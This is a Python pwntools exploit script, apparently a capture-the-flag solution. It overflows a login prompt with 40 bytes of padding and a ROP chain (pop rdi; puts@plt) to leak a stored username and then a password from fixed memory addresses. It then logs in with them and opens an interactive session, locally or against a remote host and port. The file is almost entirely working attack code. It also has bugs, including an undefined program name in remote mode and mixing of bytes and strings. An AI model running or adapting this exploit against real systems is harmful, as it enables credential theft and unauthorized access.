import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

###address###

puts_plt = 0x00000000004006a0
username_addr = 0x6020c0
password_addr = 0x6020e0

pop_rdi = 0x0000000000400b03

###main###
def main():
    if len(sys.argv) == 2:
        program_name = sys.argv[1]
        target = process(program_name)
        logging.info("***local exploit ***")

    else:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        logging.info("***remote exploit ***")
        logging.info("[*]target host : " + HOST)
        logging.info("[*]target port : " + str(PORT))
        target = remote(HOST, PORT)

    ###payload###
    payload = b"A" * 40
    payload += p64(pop_rdi)
    payload += p64(username_addr)
    payload += p64(puts_plt)
    
    _ = target.recvuntil("Username: ")
    target.sendline(payload)
    _ = target.recvuntil("Password: ")
    target.shutdown('stdin')

    username = target.recvline()
    target.close()
    print("[*]user name is ... " + username)

    target = process(program_name)
    # target = remote(HOST, PORT)

    payload = b"A" * 40
    payload += p64(pop_rdi)
    payload += p64(password_addr)
    payload += p64(puts_plt)
    
    _ = target.recvuntil("Username: ")
    target.sendline(payload)
    _ = target.recvuntil("Password: ")
    target.shutdown('stdin')

    password = target.recvline()
    target.close()
    print("[*]user name is ... " + password)   

    target = process(program_name)
    _ = target.recvuntil("Username: ")
    target.sendline(username)
    _ = target.recvuntil("Password: ")
    target.sendline(password)

    target.interactive()

if __name__ == "__main__":
    main()
